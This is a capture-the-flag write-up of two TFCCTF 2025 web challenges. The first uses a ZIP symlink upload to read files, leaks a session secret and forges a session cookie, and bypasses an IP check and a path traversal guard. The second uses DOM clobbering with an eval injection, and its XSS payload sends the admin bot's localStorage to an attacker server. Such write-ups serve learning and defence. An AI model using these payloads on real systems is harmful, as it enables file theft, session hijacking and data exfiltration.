---
title: "TFCCTF 2025 Writeup: ZIP Symlink File Read and DOM Clobbering"
date: 2025-08-31
draft: false
description: "TFCCTF 2025 web writeups: SLIPPY abuses a ZIP symlink for arbitrary file read, DOM NOTIFY uses DOM clobbering against a Puppeteer admin bot."
tags: ["CTF", "Web", "File Upload", "DOM Clobbering", "XSS"]
---

<h2>🏆 458/1794</h2>



## <span class="text-primary-400">Writeup </span>/ <span class="text-primary-400">Notes</span>

---

### Web

#### SLIPPY
168 / 1794 solves

> The challenge provided an upload form that allowed us to submit arbitrary ZIP archives. Once uploaded, the contents were automatically extracted, and a download button appeared for the files. <br><br>The objective was to retrieve a flag.txt file, hidden in a randomly generated directory inside the root folder. To achieve this, we used a ZIP-Slip attack by placing malicious symlinks inside a crafted ZIP archive.<br><br>
In addition, a debugging endpoint had to be bypassed. Using the arbitrary file read via the symlink trick, we escalated this into an arbitrary directory read, which eventually revealed the random folder containing the flag.

<details>

Checkig the source code, we can see that there is an insecure unzip opereration:

```js
execFile('unzip', [zipPath, '-d', userDir], (err, stdout, stderr) => {
  ...
});
```

Here the attacker controls the ZIP-Path coming from: <br>
`const zipPath = req.file.path;`

To exploit this vulnerability, we can craft a malicious symlink that points to arbitrary files on the target system, allowing us to exfiltrate sensitive data. Reviewing the source code reveals an `.env` file containing the Node.js session secret, as well as a redacted secret within `server.js` that is used for the develop cookie.<br>

```js
store.set('<REDACTED>', sessionData, err => {
  ...
});
```

First, we create the needed ZIP archives and upload them to the server:<br>

```js
$ ln -s ../../.env env
$ ln -s ../../server.js server

$ zip env.zip env
$ zip server.zip server
```

Then we can use the corresponding "download" button from the application to download these files:<br>

```js
SESSION_SECRET=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b
```

```js
store.set('amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E', sessionData, err => {
  if (err) console.error('Failed to create develop session:', err);
  else console.log('Development session created!');
});
```

Next, let’s debug the application and attempt to get the exploit working locally first. To do this, we need to change the `userId` value to `develop`. Without this modification, access to the `/debug/files` endpoint is denied. This endpoint is important, as it provides us with the directory listing we need.<br>

{{< highlight jsx "linenos=false,hl_lines=3" >}}
module.exports = function (req, res, next) {
  if (!isValidUserId(req.session.userId)) {
    req.session.userId = 'develop' // crypto.randomBytes(8).toString('hex');
    console.log("You are a developer!")
  }

  const userDir = path.join(__dirname, '../uploads', req.session.userId);
  fs.mkdirSync(userDir, { recursive: true });

  next();
};
{{< /highlight >}}

Adding some debugging to the App:<br>

```js
module.exports = function (req, res, next) {
  console.log("UID " + req.session.userId)
  console.log("IP " + req.ip)
  if (req.session.userId === 'develop' && req.ip == '127.0.0.1') {
    return next();
  }
  res.status(403).send('Forbidden: Development access only');
};
```

I tried accessing the debug endpoint and got:<br>

```js
UID develop
IP ::ffff:127.0.0.1
```

The uid is correct, but the IP address doesn’t match the expected value. To bypass this check, we can simply try to add a header such as `X-Forwarded-For` to spoof our IP address.

```js
UID develop
IP 127.0.0.1
TypeError [ERR_INVALID_ARG_TYPE]: The "path" argument must be of type string. Received undefined
    at Object.join (node:path:1304:7)
    ...
```

Success! Now that we have access to the endpoint, the next step is to generate a valid `connection.id` cookie for the develop user.<br>

```js
node -e "const crypto = require('crypto'); \
const secret = '3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b'; \
const sessionId = 'amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E'; \
const sig = crypto.createHmac('sha256', secret).update(sessionId).digest('base64').replace(/=/g, ''); \
console.log(\`connect.sid=s%3A\${sessionId}.\${sig}\`);"

connect.sid=s%3AamwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE
```

Great — we can now access the endpoint on the actual target as well. By using the `/debug/files?session_id=../../../` path traversal trick, we’re able to list the internal filesystem. This behavior originates from the following part of the application:<br>

```js
...
const userDir = path.join(__dirname, '../uploads', req.query.session_id);
...
```

Now checking the `Dockerfile` we can see there should be a random directory in the root:<br>

```docker
RUN rand_dir="/$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)"; mkdir "$rand_dir" && echo "TFCCTF{Fake_fLag}" > "$rand_dir/flag.txt" && chmod -R +r "$rand_dir"
```

After a bit of digging, I found the endpoint https://web-slippy-a503965643471516.challs.tfcctf.com/debug/files?session_id=../../../../tlhedn6f/. Using the symlink trick, I tried again — but nothing. It just wouldn’t work. No matter what I did, I kept running into a download error in the browser. Eventually, I gave up for the evening.

When I came back the next day and retried the same approach… boom — it suddenly worked! Most likely this was due to a bug with the challenge instance or just my browser acting up.


```js
ln -s /tlhedn6f/flag.txt flag
zip flag.zip flag

TFCCTF{3at_sl1P_h4Ck_r3p3at_5af9f1}
```

</details>

---

#### DOM NOTIFY
21 / 1794 solves

> The challenge provided an input form for note messages, which could be saved and then reported to an administrator. When a note was reported, a bot running with Puppeteer opened it in a browser, extracted the message content, and stored the flag in its local storage. <br><br>The objective was to bypass the DOMPurify 3.2.5 sanitizer to achieve XSS and exfiltrate the flag from local storage. However, there were two main hurdles: only a restricted set of HTML tags and attributes were allowed, and the sanitizer stripped most obvious payloads. <br><br>To solve this, we leveraged a DOM Clobbering attack in combination with a misconfigured Sanitizer. By using custom HTML elements, we could abuse the `attributeChangedCallback` function, which internally used an `eval` call on user-supplied input. This allowed us to execute arbitrary JavaScript and extract the flag.

<details>

Examining the source code, we can see that the application is vulnerable to XSS through a custom element implementation:

```js
function createElements(elements) {
    for (var element of elements) {
        // Registers a custom element
        customElements.define(element.name, class extends HTMLDivElement {
            static get observedAttributes() {
                if (element.observedAttribute.includes('-')) {
                    return [element.observedAttribute];
                }
                console.log("RETURN EMPTY")
                return [];
            }

            attributeChangedCallback(name, oldValue, newValue) {
                // Log when attribute is changed
                eval(`console.log('Old value: ${oldValue}', 'New Value: ${newValue}')`)
            }
        }, { extends: 'div' });
    }
}
```

The sanitizer had the following restrictions:
```js
ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'div', 'span']
ALLOWED_ATTR: ['id', 'class', 'name', 'href', 'title']
```

Looking closely at the sanitizer implementation, we noticed an interesting detail:

{{< highlight jsx "linenos=false,hl_lines=9" >}}
function sanitizeContent(content) {
    // Sanitize the note with DOMPurify
    content = DOMPurify.sanitize(content, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'div', 'span'],
        ALLOWED_ATTR: ['id', 'class', 'name', 'href', 'title']
    });

    // Make sure that no empty strings are left in the attributes values
    content = content.replace(/""/g, 'invalid-value');

    return content
}
{{< /highlight >}}

The `invalid-value` replacement for empty strings was the key to our exploit. We needed to leverage DOM Clobbering to manipulate the `window.custom_elements` object:

```js
// window.custom_elements.enabled = true;
const endpoint = window.custom_elements.endpoint || '/custom-divs';
```

First, we created a note with DOM Clobbering to enable the custom elements functionality:

```html
<div id=custom_elements>
<div id=custom_elements name=enabled>
```

This successfully enabled the custom elements and we observed the following console log:
```
Enabled:
main.js:5 endpoint: /custom-divs
main.js:8 Fetching elements
main.js:16 Custom Elements fetched: (3) [{…}, {…}, {…}]
```

The application was fetching custom elements from the `/custom-divs` endpoint. Since we could control this endpoint through DOM Clobbering, we created a custom JSON endpoint hosting our malicious element data:

```html
<a id=custom_elements>
<a id=custom_elements name=enabled>
<a id=custom_elements name=endpoint href=//<atk_server>:1337>
```

With our Express server serving the following JSON at the root path:
```json
{
  "name":"invalid-value",
  "observedAttribute":"arial-label"
}
```

Finally, we submitted our note containing the exploit payload:
```html
<a id=custom_elements>
<a id=custom_elements name=enabled>
<a id=custom_elements name=endpoint href=//<atk_server>:1337>
<div is="invalid-value" arial-label="');fetch('//<atk_server>/?flag='+JSON.stringify(localStorage));//"></div>
```

This would break out of the string in the eval and trigger our custom payload:
```js
eval(`console.log('Old value: ${oldValue}', 'New Value: ${newValue}')`)
```

When the admin bot visited our note, it executed our payload and exfiltrated the flag from localStorage to our server.

</details>